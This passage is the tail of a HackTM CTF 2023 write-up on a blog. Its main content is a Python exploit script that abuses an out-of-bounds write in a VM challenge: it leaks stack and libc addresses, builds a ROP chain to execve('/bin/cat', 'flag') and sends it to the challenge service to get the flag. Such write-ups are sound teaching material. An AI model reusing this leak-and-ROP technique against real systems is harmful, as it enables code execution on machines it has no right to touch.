</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set t0 = 0x800ffff0. We will use this as the address of /bin/cat</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t0&#39;</span>), reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">0x80</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t0&#39;</span>), reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t0&#39;</span>), reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">0x0f</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t0&#39;</span>), reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t0&#39;</span>), reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">0xff</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t0&#39;</span>), reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t0&#39;</span>), reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">0xf0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a0 = 0x7461632f6e69622f (&#39;/bin/cat&#39;)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x74</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x61</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x63</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x2f</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x6e</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x69</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x62</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x2f</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Store &#39;/bin/cat&#39; in mem[t0] (which resides in stack)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">0</span>, reg(<span style="color:#c30">&#39;a0&#39;</span>)) <span style="color:#09f;font-style:italic"># mem[t0] = a0 = &#39;/bin/cat&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">0x8</span>, reg(<span style="color:#c30">&#39;s11&#39;</span>)) <span style="color:#09f;font-style:italic"># mem[t0+0x8] = s11 = 0 (Add null terminator for /bin/cat string)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a1 = 0x67616c66 (&#39;flag&#39;)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a1&#39;</span>), reg(<span style="color:#c30">&#39;a1&#39;</span>), <span style="color:#f60">0x67</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a1&#39;</span>), reg(<span style="color:#c30">&#39;a1&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a1&#39;</span>), reg(<span style="color:#c30">&#39;a1&#39;</span>), <span style="color:#f60">0x61</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a1&#39;</span>), reg(<span style="color:#c30">&#39;a1&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a1&#39;</span>), reg(<span style="color:#c30">&#39;a1&#39;</span>), <span style="color:#f60">0x6c</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a1&#39;</span>), reg(<span style="color:#c30">&#39;a1&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a1&#39;</span>), reg(<span style="color:#c30">&#39;a1&#39;</span>), <span style="color:#f60">0x66</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Store &#39;flag&#39; in mem[t0+0x10]</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;t0&#39;</span>), <span style="color:#f60">0x10</span>, reg(<span style="color:#c30">&#39;a1&#39;</span>)) <span style="color:#09f;font-style:italic"># mem[t0+0x10] = a1 = &#39;flag&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set t1 = 0x800fffd0. We will use this as the address of pointer to argv</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t1&#39;</span>), reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">0x80</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t1&#39;</span>), reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t1&#39;</span>), reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">0x0f</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t1&#39;</span>), reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t1&#39;</span>), reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">0xff</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t1&#39;</span>), reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t1&#39;</span>), reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">0xd0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a2 = stack address of argv[0] (string &#39;/bin/cat&#39;)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_LD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x58</span>, reg(<span style="color:#c30">&#39;a2&#39;</span>)) <span style="color:#09f;font-style:italic"># a2 = mem[sp+0x58]. Observation via gdb, mem[sp+0x58] contains stack address value</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a2&#39;</span>), reg(<span style="color:#c30">&#39;a2&#39;</span>), <span style="color:#f60">0xef0</span>)  <span style="color:#09f;font-style:italic"># Subtract the leaked value by 0x120. Now, a2 = stack address of argv[0] (address of mem[t0])</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;s0&#39;</span>), reg(<span style="color:#c30">&#39;a2&#39;</span>), <span style="color:#f60">0x0</span>) <span style="color:#09f;font-style:italic"># s0 = a2</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;s1&#39;</span>), reg(<span style="color:#c30">&#39;a2&#39;</span>), <span style="color:#f60">0xfe0</span>) <span style="color:#09f;font-style:italic"># s1 = a2-0x20, which is the address of mem[t1] (pointer to argv)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Build argv payload</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">0</span>, reg(<span style="color:#c30">&#39;s0&#39;</span>)) <span style="color:#09f;font-style:italic"># mem[t1] = s0 = argv[0]</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;s0&#39;</span>), reg(<span style="color:#c30">&#39;s0&#39;</span>), <span style="color:#f60">0x10</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">0x8</span>, reg(<span style="color:#c30">&#39;s0&#39;</span>)) <span style="color:#09f;font-style:italic"># mem[t1+0x8] = s0+0x10 = argv[1]</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;t1&#39;</span>), <span style="color:#f60">0x10</span>, reg(<span style="color:#c30">&#39;s11&#39;</span>)) <span style="color:#09f;font-style:italic"># mem[t1+0x10] = s11 = NULL</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set t2 = 0x800ffd58. We will use this to leak libc base</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0x80</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0x0f</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0xfd</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0x58</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a3 = mem[t2]</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_LD(reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0x0</span>, reg(<span style="color:#c30">&#39;a3&#39;</span>)) <span style="color:#09f;font-style:italic"># a3 = mem[t2]. Observation via gdb, mem[t2] contains libc address. Now, a3 contains libc address</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> _ <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">82</span>):
</span></span><span style="display:flex;"><span>    payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a3&#39;</span>), reg(<span style="color:#c30">&#39;a3&#39;</span>), <span style="color:#f60">0xf00</span>) <span style="color:#09f;font-style:italic"># Subtract it by 0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a3&#39;</span>), reg(<span style="color:#c30">&#39;a3&#39;</span>), <span style="color:#f60">0xf30</span>) <span style="color:#09f;font-style:italic"># subtract it by 0xd0. Now, a3 == libc_base</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a4 = pop_rdi</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a4&#39;</span>), reg(<span style="color:#c30">&#39;a3&#39;</span>), <span style="color:#f60">0x16a</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> _ <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">0xbe</span>):
</span></span><span style="display:flex;"><span>    payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a4&#39;</span>), reg(<span style="color:#c30">&#39;a4&#39;</span>), <span style="color:#f60">0x300</span>) <span style="color:#09f;font-style:italic"># a4 == pop_rdi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a5 = ret</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a5&#39;</span>), reg(<span style="color:#c30">&#39;a4&#39;</span>), <span style="color:#f60">0x1</span>) <span style="color:#09f;font-style:italic"># a5 == ret</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a6 = pop_rsi</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a6&#39;</span>), reg(<span style="color:#c30">&#39;a3&#39;</span>), <span style="color:#f60">0x21f</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> _ <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">0xca</span>):
</span></span><span style="display:flex;"><span>    payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a6&#39;</span>), reg(<span style="color:#c30">&#39;a6&#39;</span>), <span style="color:#f60">0x300</span>) <span style="color:#09f;font-style:italic"># a6 == pop_rsi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a7 = execve</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a7&#39;</span>), reg(<span style="color:#c30">&#39;a3&#39;</span>), <span style="color:#f60">0x10b</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> _ <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">0x4be</span>):
</span></span><span style="display:flex;"><span>    payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a7&#39;</span>), reg(<span style="color:#c30">&#39;a7&#39;</span>), <span style="color:#f60">0x300</span>) <span style="color:#09f;font-style:italic"># a7 == execve</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># RIP Control</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Based on observation in gdb, mem[sp+0x18] == Stored RIP Address</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x18</span>, reg(<span style="color:#c30">&#39;a4&#39;</span>)) <span style="color:#09f;font-style:italic"># pop rdi; ret</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x20</span>, reg(<span style="color:#c30">&#39;a2&#39;</span>)) <span style="color:#09f;font-style:italic"># address of &#39;/bin/cat&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x28</span>, reg(<span style="color:#c30">&#39;a5&#39;</span>)) <span style="color:#09f;font-style:italic"># ret (For stack alignment)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x30</span>, reg(<span style="color:#c30">&#39;a6&#39;</span>)) <span style="color:#09f;font-style:italic"># pop rsi; ret</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x38</span>, reg(<span style="color:#c30">&#39;s1&#39;</span>)) <span style="color:#09f;font-style:italic"># address of argv array</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x40</span>, reg(<span style="color:#c30">&#39;a7&#39;</span>)) <span style="color:#09f;font-style:italic"># call execve</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Send Payload</span>
</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;(hex-encoded):&#39;</span>, payload<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
</div><p><p class="markdown-image">
  <img src="https://i.imgur.com/g6S0sxt.png" alt=""  />
</p></p>
<p>And we got the flag!</p>
<blockquote>
<p>Flag: <code>HackTM{Now_get_an_A_for_the_class!}</code></p>
</blockquote>
<h1 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>

      </div>
      
        
  <aside class="toc-container">
    <a href="#" style="font-weight: 700; color: black;">HackTM CTF 2023</a>
    <div class="js-toc">
      <details>
          <summary>Table of Contents
          </summary>
          <div>
              <nav id="TableOfContents">
  <ul>
    <li><a href="#initial-analysis">Initial Analysis</a></li>
    <li><a href="#exploitation">Exploitation</a></li>
  </ul>
</nav>
          </div>
      </details>
    </div>
  </aside>


      
    </div>

    
        <div class="tags">
            
                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
            
                <a href="https://chovid99.github.io/tags/hacktm">HackTM</a>
            
                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
            
                <a href="https://chovid99.github.io/tags/vm">vm</a>
            
                <a href="https://chovid99.github.io/tags/oob">oob</a>
            
                <a href="https://chovid99.github.io/tags/2023">2023</a>
            
        </div>
    
    
    
  <div id="comment">
    
    
  </div>


</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="/js/tocbot.min.js"></script>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.js-toc',
      
      contentSelector: '.js-toc-content',
      headingSelector: 'h1, h2, h3',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
  function initTOC() {
    var windowWidth = 1316;
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
  }
  window.onload = initTOC;

  var lastWindowWidth = $(window).width();
  $(window).resize(function() {
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
    lastWindowWidth = $(window).width();
  });
</script>

    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 